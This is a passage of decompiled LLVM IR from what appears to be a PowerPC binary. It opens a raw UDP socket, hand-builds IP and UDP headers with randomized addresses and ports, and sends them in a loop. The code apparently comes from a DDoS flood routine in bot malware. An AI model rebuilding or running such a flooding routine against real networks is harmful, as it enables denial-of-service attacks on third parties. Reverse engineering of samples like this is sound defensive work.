  store i32 3, i32* %r5.global-to-local, align 4
  %v0_10005718 = load i32, i32* @r28, align 4
  %v1_1000571c = urem i32 %v5_10005708, 256
  store i32 %v1_1000571c, i32* %r19.global-to-local, align 4
  %v0_10005720 = load i32, i32* @r29, align 4
  store i32 %v0_10005720, i32* %r3.global-to-local, align 4
  store i32 268457768, i32* @lr, align 4
  %v4_10005724 = inttoptr i32 %v0_10005718 to i32*
  %v5_10005724 = call i32 @function_1000235c(i32 %v0_10005720, i32* %v4_10005724, i32 3, i32 65535)
  %v0_10005728 = load i32, i32* @r28, align 4
  store i32 4, i32* %r5.global-to-local, align 4
  store i32 64, i32* %r6.global-to-local, align 4
  store i32 %v5_10005724, i32* %r21.global-to-local, align 4
  %v0_10005738 = load i32, i32* @r29, align 4
  store i32 %v0_10005738, i32* %r3.global-to-local, align 4
  store i32 268457792, i32* @lr, align 4
  %v4_1000573c = inttoptr i32 %v0_10005728 to i32*
  %v5_1000573c = call i32 @function_1000235c(i32 %v0_10005738, i32* %v4_1000573c, i32 4, i32 64)
  %v0_10005740 = load i32, i32* @r28, align 4
  store i32 5, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v1_1000574c = urem i32 %v5_1000573c, 256
  store i32 %v1_1000574c, i32* %r26.global-to-local, align 4
  %v0_10005750 = load i32, i32* @r29, align 4
  store i32 %v0_10005750, i32* %r3.global-to-local, align 4
  store i32 268457816, i32* @lr, align 4
  %v4_10005754 = inttoptr i32 %v0_10005740 to i32*
  %v5_10005754 = call i32 @function_1000235c(i32 %v0_10005750, i32* %v4_10005754, i32 5, i32 0)
  store i32 65535, i32* %r6.global-to-local, align 4
  store i32 6, i32* %r5.global-to-local, align 4
  %v0_10005764 = load i32, i32* @r28, align 4
  %v1_10005768 = urem i32 %v5_10005754, 256
  store i32 %v1_10005768, i32* @r31, align 4
  %v0_1000576c = load i32, i32* @r29, align 4
  store i32 %v0_1000576c, i32* %r3.global-to-local, align 4
  store i32 268457844, i32* @lr, align 4
  %v4_10005770 = inttoptr i32 %v0_10005764 to i32*
  %v5_10005770 = call i32 @function_1000235c(i32 %v0_1000576c, i32* %v4_10005770, i32 6, i32 65535)
  store i32 7, i32* %r5.global-to-local, align 4
  store i32 27015, i32* %r6.global-to-local, align 4
  %v0_1000577c = load i32, i32* @r28, align 4
  store i32 %v5_10005770, i32* %r22.global-to-local, align 4
  %v0_10005784 = load i32, i32* @r29, align 4
  store i32 %v0_10005784, i32* %r3.global-to-local, align 4
  store i32 268457868, i32* @lr, align 4
  %v4_10005788 = inttoptr i32 %v0_1000577c to i32*
  %v5_10005788 = call i32 @function_1000235c(i32 %v0_10005784, i32* %v4_10005788, i32 7, i32 27015)
  store i32 %v5_10005788, i32* %r29.global-to-local, align 4
  store i32 29, i32* %r3.global-to-local, align 4
  store i32 268457880, i32* @lr, align 4
  %v1_10005794 = call i32 @function_1000a2ec(i32 29)
  store i32 29, i32* %r3.global-to-local, align 4
  %v3_100057a0 = call i32 @function_1000a238(i32 29, i32* nonnull %stack_var_-84)
  store i32 %v3_100057a0, i32* %r30.global-to-local, align 4
  store i32 17, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268457912, i32* @lr, align 4
  %v3_100057b4 = call i32 @function_1000c1bc(i32 2, i32 3, i32 17)
  store i32 %v3_100057b4, i32* %r3.global-to-local, align 4
  %v3_100057b8 = icmp eq i32 %v3_100057b4, -1
  store i32 %v3_100057b4, i32* %r25.global-to-local, align 4
  br i1 %v3_100057b8, label %dec_label_pc_10005a08, label %dec_label_pc_100057c4

dec_label_pc_100057c4:                            ; preds = %dec_label_pc_10005684
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r5.global-to-local, align 4
  %v2_100057d0 = ptrtoint i32* %stack_var_-88 to i32
  store i32 %v2_100057d0, i32* %r6.global-to-local, align 4
  store i32 4, i32* %r7.global-to-local, align 4
  store i32 1, i32* %stack_var_-88, align 4
  store i32 268457952, i32* @lr, align 4
  %v5_100057dc = call i32 @function_1000c180(i32 0, i32 3, i32 %v2_100057d0, i32 4, i32 4)
  store i32 %v5_100057dc, i32* %r3.global-to-local, align 4
  %v3_100057e0 = icmp eq i32 %v5_100057dc, -1
  br i1 %v3_100057e0, label %dec_label_pc_10005a00, label %dec_label_pc_100057e8

dec_label_pc_100057e8:                            ; preds = %dec_label_pc_100057c4
  %v0_100057e8 = load i32, i32* %r23.global-to-local, align 4
  %v1_100057e8 = icmp slt i32 %v0_100057e8, 0
  %v3_100057e8 = icmp eq i32 %v0_100057e8, 0
  store i1 %v1_100057e8, i1* %cr4_lt.global-to-local, align 1
  store i1 %v3_100057e8, i1* %cr4_eq.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_100057f0 = load i32, i32* %r21.global-to-local, align 4
  %v1_100057f0 = urem i32 %v0_100057f0, 65536
  store i32 %v1_100057f0, i32* %r20.global-to-local, align 4
  store i32 0, i32* %stack_var_-88, align 4
  %v0_100057f8 = load i32, i32* %r22.global-to-local, align 4
  %v1_100057f8 = urem i32 %v0_100057f8, 65536
  store i32 %v1_100057f8, i32* %r21.global-to-local, align 4
  %v0_100057fc = load i32, i32* %r29.global-to-local, align 4
  %v1_100057fc = urem i32 %v0_100057fc, 65536
  store i32 %v1_100057fc, i32* %r22.global-to-local, align 4
  %tmp32 = icmp slt i32 %v0_100057e8, 1
  br i1 %tmp32, label %dec_label_pc_100058d4.outer, label %dec_label_pc_10005804

dec_label_pc_10005804:                            ; preds = %dec_label_pc_100057e8
  %v0_10005804 = load i32, i32* @r31, align 4
  %v3_10005804 = icmp eq i32 %v0_10005804, 0
  store i1 %v3_10005804, i1* %cr3_eq.global-to-local, align 1
  store i32 4, i32* %r29.global-to-local, align 4
  store i32 5, i32* %r28.global-to-local, align 4
  store i32 16384, i32* %r18.global-to-local, align 4
  store i32 17, i32* %r17.global-to-local, align 4
  store i32 -1, i32* %r16.global-to-local, align 4
  br label %dec_label_pc_10005824

dec_label_pc_10005824:                            ; preds = %dec_label_pc_10005880, %dec_label_pc_10005804
  store i32 128, i32* %r3.global-to-local, align 4
  store i32 268458032, i32* @lr, align 4
  %v2_1000582c = call i32 @function_1000c548(i32 128, i32 1)
  store i32 %v2_1000582c, i32* %r3.global-to-local, align 4
  %v3_10005830 = load i32, i32* %stack_var_-88, align 4
  store i32 %v3_10005830, i32* %r0.global-to-local, align 4
  %v0_10005834 = load i32, i32* @r31, align 4
  %v1_10005834 = mul i32 %v0_10005834, 4
  store i32 %v1_10005834, i32* %r9.global-to-local, align 4
  %v0_10005838 = load i32, i32* @r30, align 4
  %v2_1000583c = load i32, i32* %r24.global-to-local, align 4
  %v3_1000583c = add i32 %v2_1000583c, %v1_10005834
  %v4_1000583c = inttoptr i32 %v3_1000583c to i32*
  store i32 %v2_1000582c, i32* %v4_1000583c, align 4
  %v0_10005840 = load i32, i32* %r0.global-to-local, align 4
  %v1_10005840 = mul i32 %v0_10005840, 4
  store i32 %v1_10005840, i32* %r0.global-to-local, align 4
  %v0_10005844 = load i32, i32* %r24.global-to-local, align 4
  %v2_10005844 = add i32 %v0_10005844, %v1_10005840
  %v3_10005844 = inttoptr i32 %v2_10005844 to i32*
  %v4_10005844 = load i32, i32* %v3_10005844, align 4
  store i32 %v4_10005844, i32* %r10.global-to-local, align 4
  %v1_10005848 = inttoptr i32 %v4_10005844 to i32*
  %v2_10005848 = load i32, i32* %v1_10005848, align 4
  store i32 %v2_10005848, i32* %r0.global-to-local, align 4
  %v1_1000584c = add i32 %v4_10005844, 32
  store i32 %v1_1000584c, i32* %r3.global-to-local, align 4
  %v0_10005850 = load i32, i32* %r20.global-to-local, align 4
  %v1_10005850 = trunc i32 %v0_10005850 to i16
  %v3_10005850 = add i32 %v4_10005844, 4
  %v4_10005850 = inttoptr i32 %v3_10005850 to i16*
  store i16 %v1_10005850, i16* %v4_10005850, align 2
  %v0_10005854 = load i32, i32* %r10.global-to-local, align 4
  %v1_10005854 = add i32 %v0_10005854, 20
  store i32 %v1_10005854, i32* %r8.global-to-local, align 4
  %v1_10005858 = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_10005858, i32* %r0.global-to-local, align 4
  %v1_1000585c = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_1000585c, i32* %r0.global-to-local, align 4
  %v1_10005860 = load i32, i32* %r10.global-to-local, align 4
  %v2_10005860 = inttoptr i32 %v1_10005860 to i32*
  store i32 %v1_1000585c, i32* %v2_10005860, align 4
  %v0_10005864 = load i32, i32* %r19.global-to-local, align 4
  %v1_10005864 = trunc i32 %v0_10005864 to i8
  %v2_10005864 = load i32, i32* %r10.global-to-local, align 4
  %v3_10005864 = add i32 %v2_10005864, 1
  %v4_10005864 = inttoptr i32 %v3_10005864 to i8*
  store i8 %v1_10005864, i8* %v4_10005864, align 1
  %v3_10005868 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_10005868, i32* %r9.global-to-local, align 4
  %v0_1000586c = load i32, i32* %r26.global-to-local, align 4
  %v1_1000586c = trunc i32 %v0_1000586c to i8
  %v2_1000586c = load i32, i32* %r10.global-to-local, align 4
  %v3_1000586c = add i32 %v2_1000586c, 8
  %v4_1000586c = inttoptr i32 %v3_1000586c to i8*
  store i8 %v1_1000586c, i8* %v4_1000586c, align 1
  %v0_10005870 = load i32, i32* %r9.global-to-local, align 4
  %v1_10005870 = add i32 %v0_10005870, 32
  store i32 %v1_10005870, i32* %r9.global-to-local, align 4
  %v1_10005874 = trunc i32 %v1_10005870 to i16
  %v2_10005874 = load i32, i32* %r10.global-to-local, align 4
  %v3_10005874 = add i32 %v2_10005874, 2
  %v4_10005874 = inttoptr i32 %v3_10005874 to i16*
  store i16 %v1_10005874, i16* %v4_10005874, align 2
  %v0_10005878 = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_10005878, label %dec_label_pc_10005880, label %dec_label_pc_1000587c

dec_label_pc_1000587c:                            ; preds = %dec_label_pc_10005824
  %v0_1000587c = load i32, i32* %r18.global-to-local, align 4
  %v1_1000587c = trunc i32 %v0_1000587c to i16
  %v2_1000587c = load i32, i32* %r10.global-to-local, align 4
  %v3_1000587c = add i32 %v2_1000587c, 6
  %v4_1000587c = inttoptr i32 %v3_1000587c to i16*
  store i16 %v1_1000587c, i16* %v4_1000587c, align 2
  br label %dec_label_pc_10005880

dec_label_pc_10005880:                            ; preds = %dec_label_pc_10005824, %dec_label_pc_1000587c
  %v0_10005880 = load i32, i32* %r17.global-to-local, align 4
  %v1_10005880 = trunc i32 %v0_10005880 to i8
  %v2_10005880 = load i32, i32* %r10.global-to-local, align 4
  %v3_10005880 = add i32 %v2_10005880, 9
  %v4_10005880 = inttoptr i32 %v3_10005880 to i8*
  store i8 %v1_10005880, i8* %v4_10005880, align 1
  %v0_10005884 = load i32, i32* %r21.global-to-local, align 4
  %v1_10005884 = trunc i32 %v0_10005884 to i16
  %v2_10005884 = load i32, i32* %r10.global-to-local, align 4
  %v3_10005884 = add i32 %v2_10005884, 20
  %v4_10005884 = inttoptr i32 %v3_10005884 to i16*
  store i16 %v1_10005884, i16* %v4_10005884, align 2
  %v3_10005888 = load i32, i32* %stack_var_-88, align 4
  %v3_1000588c = load i32, i32* @global_var_1001eb10.71, align 4
  store i32 %v3_1000588c, i32* %r0.global-to-local, align 4
  %v1_10005890 = mul i32 %v3_10005888, 24
  store i32 %v1_10005890, i32* %r9.global-to-local, align 4
  %v0_10005894 = load i32, i32* %r22.global-to-local, align 4
  %v1_10005894 = trunc i32 %v0_10005894 to i16
  %v2_10005894 = load i32, i32* %r8.global-to-local, align 4
  %v3_10005894 = add i32 %v2_10005894, 2
  %v4_10005894 = inttoptr i32 %v3_10005894 to i16*
  store i16 %v1_10005894, i16* %v4_10005894, align 2
  %v0_10005898 = load i32, i32* %r0.global-to-local, align 4
  %v1_10005898 = load i32, i32* %r10.global-to-local, align 4
  %v2_10005898 = add i32 %v1_10005898, 12
  %v3_10005898 = inttoptr i32 %v2_10005898 to i32*
  store i32 %v0_10005898, i32* %v3_10005898, align 4
  %v0_1000589c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000589c = load i32, i32* %r27.global-to-local, align 4
  %v2_1000589c = add i32 %v1_1000589c, %v0_1000589c
  store i32 %v2_1000589c, i32* %r9.global-to-local, align 4
  %v1_100058a0 = add i32 %v2_1000589c, 16
  %v2_100058a0 = inttoptr i32 %v1_100058a0 to i32*
  %v3_100058a0 = load i32, i32* %v2_100058a0, align 4
  store i32 %v3_100058a0, i32* %r0.global-to-local, align 4
  %v3_100058a4 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_100058a4, i32* %r11.global-to-local, align 4
  %v0_100058a8 = load i32, i32* %r16.global-to-local, align 4
  %v1_100058a8 = load i32, i32* %r10.global-to-local, align 4
  %v2_100058a8 = add i32 %v1_100058a8, 28
  %v3_100058a8 = inttoptr i32 %v2_100058a8 to i32*
  store i32 %v0_100058a8, i32* %v3_100058a8, align 4
  %v0_100058ac = load i32, i32* %r0.global-to-local, align 4
  %v1_100058ac = load i32, i32* %r10.global-to-local, align 4
  %v2_100058ac = add i32 %v1_100058ac, 16
  %v3_100058ac = inttoptr i32 %v2_100058ac to i32*
  store i32 %v0_100058ac, i32* %v3_100058ac, align 4
  %v0_100058b0 = load i32, i32* %r11.global-to-local, align 4
  %v1_100058b0 = add i32 %v0_100058b0, 12
  store i32 %v1_100058b0, i32* %r11.global-to-local, align 4
  %v1_100058b4 = trunc i32 %v1_100058b0 to i16
  %v2_100058b4 = load i32, i32* %r8.global-to-local, align 4
  %v3_100058b4 = add i32 %v2_100058b4, 4
  %v4_100058b4 = inttoptr i32 %v3_100058b4 to i16*
  store i16 %v1_100058b4, i16* %v4_100058b4, align 2
  %v3_100058b8 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_100058b8, i32* %r5.global-to-local, align 4
  store i32 268458176, i32* @lr, align 4
  %v3_100058bc = call i32 @function_1000abe8(i32 %v3_100058b8, i32 %v0_10005838, i32 %v3_100058b8)
  store i32 %v3_100058bc, i32* %r3.global-to-local, align 4
  %v3_100058c0 = load i32, i32* %stack_var_-88, align 4
  store i32 %v3_100058c0, i32* %r9.global-to-local, align 4
  %v1_100058c4 = add i32 %v3_100058c0, 1
  %v1_100058c8 = load i32, i32* %r23.global-to-local, align 4
  %v2_100058c8 = icmp slt i32 %v1_100058c4, %v1_100058c8
  store i32 %v1_100058c4, i32* %stack_var_-88, align 4
  br i1 %v2_100058c8, label %dec_label_pc_10005824, label %dec_label_pc_100058d4.preheader.loopexit

dec_label_pc_100058d4.preheader.loopexit:         ; preds = %dec_label_pc_10005880
  %v0_100058d4.pre.pre = load i1, i1* %cr4_eq.global-to-local, align 1
  %v1_100058d4.pre.pre = load i1, i1* %cr4_lt.global-to-local, align 1
  br label %dec_label_pc_100058d4.outer

dec_label_pc_100058d4.outer:                      ; preds = %dec_label_pc_100059a0, %dec_label_pc_100057e8, %dec_label_pc_100058d4.preheader.loopexit
  %v1_100058d4.ph34 = phi i1 [ %v1_100057e8, %dec_label_pc_100057e8 ], [ %v1_100058d4.pre.pre, %dec_label_pc_100058d4.preheader.loopexit ], [ %v1_100059a0, %dec_label_pc_100059a0 ]
  %v0_100058d4.ph35 = phi i1 [ %v3_100057e8, %dec_label_pc_100057e8 ], [ %v0_100058d4.pre.pre, %dec_label_pc_100058d4.preheader.loopexit ], [ %v0_100059a0, %dec_label_pc_100059a0 ]
  %v2_100058d4 = or i1 %v1_100058d4.ph34, %v0_100058d4.ph35
  br label %dec_label_pc_100058d4

dec_label_pc_100058d4:                            ; preds = %dec_label_pc_100058d4.outer, %dec_label_pc_100058d4
  br i1 %v2_100058d4, label %dec_label_pc_100058d4, label %dec_label_pc_100058d8

dec_label_pc_100058d8:                            ; preds = %dec_label_pc_100058d4, %dec_label_pc_100059a0
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 0, i32* %stack_var_-88, align 4
  store i32 0, i32* %r26.global-to-local, align 4
  br label %dec_label_pc_100058e8

dec_label_pc_100058e8:                            ; preds = %dec_label_pc_10005928, %dec_label_pc_100058d8
  %v0_100058f8 = phi i32 [ %v1_10005990, %dec_label_pc_10005928 ], [ 0, %dec_label_pc_100058d8 ]
  %v1_100058e8 = mul i32 %v0_100058f8, 24
  store i32 65535, i32* %r30.global-to-local, align 4
  %v1_100058f4 = load i32, i32* %r27.global-to-local, align 4
  %v2_100058f4 = add i32 %v1_100058f4, %v1_100058e8
  store i32 %v2_100058f4, i32* %r10.global-to-local, align 4
  %v1_100058f8 = mul i32 %v0_100058f8, 4
  store i32 %v1_100058f8, i32* %r0.global-to-local, align 4
  %v1_100058fc = add i32 %v2_100058f4, 20
  %v2_100058fc = inttoptr i32 %v1_100058fc to i8*
  %v3_100058fc = load i8, i8* %v2_100058fc, align 1
  %v4_100058fc = zext i8 %v3_100058fc to i32
  store i32 %v4_100058fc, i32* %r9.global-to-local, align 4
  %v0_10005900 = load i32, i32* %r24.global-to-local, align 4
  %v2_10005900 = add i32 %v0_10005900, %v1_100058f8
  %v3_10005900 = inttoptr i32 %v2_10005900 to i32*
  %v4_10005900 = load i32, i32* %v3_10005900, align 4
  store i32 %v4_10005900, i32* %r28.global-to-local, align 4
  %v1_10005908 = add i32 %v4_10005900, 20
  store i32 %v1_10005908, i32* @r31, align 4
  %tmp33 = icmp ult i8 %v3_100058fc, 32
  br i1 %tmp33, label %dec_label_pc_100059a8, label %dec_label_pc_10005910

dec_label_pc_10005910:                            ; preds = %dec_label_pc_100058e8
  %v0_10005910 = load i32, i32* %r20.global-to-local, align 4
  %v4_10005910 = icmp eq i32 %v0_10005910, 65535
  br i1 %v4_10005910, label %dec_label_pc_100059d4, label %dec_label_pc_10005918

dec_label_pc_10005918:                            ; preds = %dec_label_pc_100059a8.dec_label_pc_10005918_crit_edge, %dec_label_pc_10005910
  %v1_10005918 = phi i32 [ %v1_10005918.pre, %dec_label_pc_100059a8.dec_label_pc_10005918_crit_edge ], [ 65535, %dec_label_pc_10005910 ]
  %v0_10005918 = load i32, i32* %r21.global-to-local, align 4
  %v4_10005918 = icmp eq i32 %v0_10005918, %v1_10005918
  br i1 %v4_10005918, label %dec_label_pc_100059e4, label %dec_label_pc_10005920

dec_label_pc_10005920:                            ; preds = %dec_label_pc_100059d4.dec_label_pc_10005920_crit_edge, %dec_label_pc_10005918
  %v1_10005920 = phi i32 [ %v1_10005920.pre, %dec_label_pc_100059d4.dec_label_pc_10005920_crit_edge ], [ %v1_10005918, %dec_label_pc_10005918 ]
  %v0_10005920 = load i32, i32* %r22.global-to-local, align 4
  %v4_10005920 = icmp eq i32 %v0_10005920, %v1_10005920
  br i1 %v4_10005920, label %dec_label_pc_100059f4, label %dec_label_pc_10005928

dec_label_pc_10005928:                            ; preds = %dec_label_pc_100059e4, %dec_label_pc_10005920, %dec_label_pc_100059f4
  %v0_10005928 = load i32, i32* %r26.global-to-local, align 4
  %v1_10005928 = trunc i32 %v0_10005928 to i16
  %v2_10005928 = load i32, i32* %r28.global-to-local, align 4
  %v3_10005928 = add i32 %v2_10005928, 10
  %v4_10005928 = inttoptr i32 %v3_10005928 to i16*
  store i16 %v1_10005928, i16* %v4_10005928, align 2
  %v0_10005930 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10005930, i32* @r3, align 4
  %v2_10005934 = call i32 @function_100060d4(i32 %v0_10005930, i32 20)
  %v3_10005934 = trunc i32 %v2_10005934 to i16
  store i32 %v2_10005934, i32* %r3.global-to-local, align 4
  %v3_10005938 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_10005938, i32* %r6.global-to-local, align 4
  %v3_1000593c = load i32, i32* %r28.global-to-local, align 4
  %v4_1000593c = add i32 %v3_1000593c, 10
  %v5_1000593c = inttoptr i32 %v4_1000593c to i16*
  store i16 %v3_10005934, i16* %v5_1000593c, align 2
  %v0_10005940 = load i32, i32* @r31, align 4
  store i32 %v0_10005940, i32* @r4, align 4
  %v0_10005944 = load i32, i32* %r26.global-to-local, align 4
  %v1_10005944 = trunc i32 %v0_10005944 to i16
  %v3_10005944 = add i32 %v0_10005940, 6
  %v4_10005944 = inttoptr i32 %v3_10005944 to i16*
  store i16 %v1_10005944, i16* %v4_10005944, align 2
  %v0_10005948 = load i32, i32* %r6.global-to-local, align 4
  %v1_10005948 = add i32 %v0_10005948, 12
  store i32 %v1_10005948, i32* %r6.global-to-local, align 4
  %v0_1000594c = load i32, i32* @r31, align 4
  %v1_1000594c = add i32 %v0_1000594c, 4
  %v2_1000594c = inttoptr i32 %v1_1000594c to i16*
  %v3_1000594c = load i16, i16* %v2_1000594c, align 2
  %v4_1000594c = zext i16 %v3_1000594c to i32
  store i32 %v4_1000594c, i32* %r5.global-to-local, align 4
  %v0_10005950 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10005950, i32* %r3.global-to-local, align 4
  %v4_10005954 = call i32 @function_10006138(i32 %v0_10005950, i32 %v0_10005940, i32 %v4_1000594c, i32 %v1_10005948)
  %v5_10005954 = trunc i32 %v4_10005954 to i16
  store i32 %v4_10005954, i32* %r3.global-to-local, align 4
  %v3_10005958 = load i32, i32* %stack_var_-88, align 4
  store i32 %v3_10005958, i32* %r7.global-to-local, align 4
  %v0_1000595c = load i32, i32* @r31, align 4
  %v1_1000595c = add i32 %v0_1000595c, 2
  %v2_1000595c = inttoptr i32 %v1_1000595c to i16*
  %v3_1000595c = load i16, i16* %v2_1000595c, align 2
  %v4_1000595c = zext i16 %v3_1000595c to i32
  store i32 %v4_1000595c, i32* %r0.global-to-local, align 4
  %v0_10005960 = load i32, i32* %r28.global-to-local, align 4
  %v1_10005964 = mul i32 %v3_10005958, 24
  store i32 %v1_10005964, i32* %r7.global-to-local, align 4
  %v3_10005968 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_10005968, i32* %r5.global-to-local, align 4
  %v4_1000596c = add i32 %v0_1000595c, 6
  %v5_1000596c = inttoptr i32 %v4_1000596c to i16*
  store i16 %v5_10005954, i16* %v5_1000596c, align 2
  store i32 16384, i32* %r6.global-to-local, align 4
  %v0_10005974 = load i32, i32* %r7.global-to-local, align 4
  %v1_10005974 = load i32, i32* %r27.global-to-local, align 4
  %v2_10005974 = add i32 %v1_10005974, %v0_10005974
  store i32 %v2_10005974, i32* %r7.global-to-local, align 4
  %v0_10005978 = load i32, i32* %r5.global-to-local, align 4
  %v1_10005978 = add i32 %v0_10005978, 32
  store i32 %v1_10005978, i32* %r5.global-to-local, align 4
  %v0_1000597c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000597c = trunc i32 %v0_1000597c to i16
  %v3_1000597c = add i32 %v2_10005974, 2
  %v4_1000597c = inttoptr i32 %v3_1000597c to i16*
  store i16 %v1_1000597c, i16* %v4_1000597c, align 2
  %v0_10005980 = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_10005980, i32* %r3.global-to-local, align 4
  store i32 16, i32* %r8.global-to-local, align 4
  store i32 268458380, i32* @lr, align 4
  %v6_10005988 = call i32 @function_1000c140(i32 %v0_10005980, i32 %v0_10005960, i32 %v1_10005978, i32 16384, i32 %v2_10005974, i32 16)
  store i32 %v6_10005988, i32* %r3.global-to-local, align 4
  %v3_1000598c = load i32, i32* %stack_var_-88, align 4
  store i32 %v3_1000598c, i32* %r9.global-to-local, align 4
  %v1_10005990 = add i32 %v3_1000598c, 1
  store i32 %v1_10005990, i32* %r11.global-to-local, align 4
  %v1_10005994 = load i32, i32* %r23.global-to-local, align 4
  %v2_10005994 = icmp slt i32 %v1_10005990, %v1_10005994
  store i32 %v1_10005990, i32* %stack_var_-88, align 4
  br i1 %v2_10005994, label %dec_label_pc_100058e8, label %dec_label_pc_100059a0

dec_label_pc_100059a0:                            ; preds = %dec_label_pc_10005928
  %v0_100059a0 = load i1, i1* %cr4_eq.global-to-local, align 1
  %v1_100059a0 = load i1, i1* %cr4_lt.global-to-local, align 1
  %v2_100059a0 = or i1 %v0_100059a0, %v1_100059a0
  br i1 %v2_100059a0, label %dec_label_pc_100058d4.outer, label %dec_label_pc_100058d8

dec_label_pc_100059a8:                            ; preds = %dec_label_pc_100058e8
  %v1_100059a8 = add i32 %v2_100058f4, 16
  %v2_100059a8 = inttoptr i32 %v1_100059a8 to i32*
  %v3_100059a8 = load i32, i32* %v2_100059a8, align 4
  store i32 %v3_100059a8, i32* %r29.global-to-local, align 4
  %v0_100059ac = call i32 @function_10007ca8()
  store i32 %v0_100059ac, i32* %r3.global-to-local, align 4
  %v3_100059b0 = load i32, i32* %stack_var_-88, align 4
  %v0_100059b4 = load i32, i32* %r20.global-to-local, align 4
  %v1_100059b4 = load i32, i32* %r30.global-to-local, align 4
  %v4_100059b4 = icmp eq i32 %v0_100059b4, %v1_100059b4
  %v1_100059b8 = mul i32 %v3_100059b0, 24
  %v1_100059bc = load i32, i32* %r27.global-to-local, align 4
  %v2_100059bc = add i32 %v1_100059bc, %v1_100059b8
  store i32 %v2_100059bc, i32* %r9.global-to-local, align 4
  %v1_100059c0 = add i32 %v2_100059bc, 20
  %v2_100059c0 = inttoptr i32 %v1_100059c0 to i8*
  %v3_100059c0 = load i8, i8* %v2_100059c0, align 1
  %v4_100059c0 = zext i8 %v3_100059c0 to i32
  store i32 %v4_100059c0, i32* %r0.global-to-local, align 4
  %tmp = urem i8 %v3_100059c0, 64
  %v2_100059c4 = zext i8 %tmp to i32
  %v3_100059c4 = lshr i32 %v0_100059ac, %v2_100059c4
  store i32 %v3_100059c4, i32* %r3.global-to-local, align 4
  %v0_100059c8 = load i32, i32* %r29.global-to-local, align 4
  %v2_100059c8 = add i32 %v3_100059c4, %v0_100059c8
  store i32 %v2_100059c8, i32* %r29.global-to-local, align 4
  %v1_100059cc = load i32, i32* %r28.global-to-local, align 4
  %v2_100059cc = add i32 %v1_100059cc, 16
  %v3_100059cc = inttoptr i32 %v2_100059cc to i32*
  store i32 %v2_100059c8, i32* %v3_100059cc, align 4
  br i1 %v4_100059b4, label %dec_label_pc_100059d4, label %dec_label_pc_100059a8.dec_label_pc_10005918_crit_edge

dec_label_pc_100059a8.dec_label_pc_10005918_crit_edge: ; preds = %dec_label_pc_100059a8
  %v1_10005918.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10005918

dec_label_pc_100059d4:                            ; preds = %dec_label_pc_100059a8, %dec_label_pc_10005910
  %v0_100059d4 = call i32 @function_10007ca8()
  %v1_100059d4 = trunc i32 %v0_100059d4 to i16
  store i32 %v0_100059d4, i32* %r3.global-to-local, align 4
  %v0_100059d8 = load i32, i32* %r21.global-to-local, align 4
  %v1_100059d8 = load i32, i32* %r30.global-to-local, align 4
  %v4_100059d8 = icmp eq i32 %v0_100059d8, %v1_100059d8
  %v3_100059dc = load i32, i32* %r28.global-to-local, align 4
  %v4_100059dc = add i32 %v3_100059dc, 4
  %v5_100059dc = inttoptr i32 %v4_100059dc to i16*
  store i16 %v1_100059d4, i16* %v5_100059dc, align 2
  br i1 %v4_100059d8, label %dec_label_pc_100059e4, label %dec_label_pc_100059d4.dec_label_pc_10005920_crit_edge

dec_label_pc_100059d4.dec_label_pc_10005920_crit_edge: ; preds = %dec_label_pc_100059d4
  %v1_10005920.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10005920

dec_label_pc_100059e4:                            ; preds = %dec_label_pc_100059d4, %dec_label_pc_10005918
  %v0_100059e4 = call i32 @function_10007ca8()
  %v1_100059e4 = trunc i32 %v0_100059e4 to i16
  store i32 %v0_100059e4, i32* %r3.global-to-local, align 4
  %v0_100059e8 = load i32, i32* %r22.global-to-local, align 4
  %v1_100059e8 = load i32, i32* %r30.global-to-local, align 4
  %v4_100059e8 = icmp eq i32 %v0_100059e8, %v1_100059e8
  %v3_100059ec = load i32, i32* %r28.global-to-local, align 4
  %v4_100059ec = add i32 %v3_100059ec, 20
  %v5_100059ec = inttoptr i32 %v4_100059ec to i16*
  store i16 %v1_100059e4, i16* %v5_100059ec, align 2
  br i1 %v4_100059e8, label %dec_label_pc_100059f4, label %dec_label_pc_10005928

dec_label_pc_100059f4:                            ; preds = %dec_label_pc_100059e4, %dec_label_pc_10005920
  %v0_100059f4 = call i32 @function_10007ca8()
  %v1_100059f4 = trunc i32 %v0_100059f4 to i16
  store i32 %v0_100059f4, i32* %r3.global-to-local, align 4
  %v3_100059f8 = load i32, i32* @r31, align 4
  %v4_100059f8 = add i32 %v3_100059f8, 2
  %v5_100059f8 = inttoptr i32 %v4_100059f8 to i16*
  store i16 %v1_100059f4, i16* %v5_100059f8, align 2
  br label %dec_label_pc_10005928

dec_label_pc_10005a00:                            ; preds = %dec_label_pc_100057c4
  %v0_10005a00 = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_10005a00, i32* %r3.global-to-local, align 4
  store i32 268458504, i32* @lr, align 4
  %v0_10005a04 = call i32 @function_1000b3f0()
  store i32 %v0_10005a04, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10005a08

dec_label_pc_10005a08:                            ; preds = %dec_label_pc_10005684, %dec_label_pc_10005a00
  store i32 %v0_10005688, i32* %r0.global-to-local, align 4
  %v1_10005a1c = call %0 @__asm_mtcrf(i32 24, i32 %v0_1000568c)
  store i32 %v0_100056c4, i32* %r28.global-to-local, align 4
  store i32 %v0_100056cc, i32* %r29.global-to-local, align 4
  store i32 %v0_100056d4, i32* %r30.global-to-local, align 4
  %v0_10005a60 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10005a60

; uselistorder directives
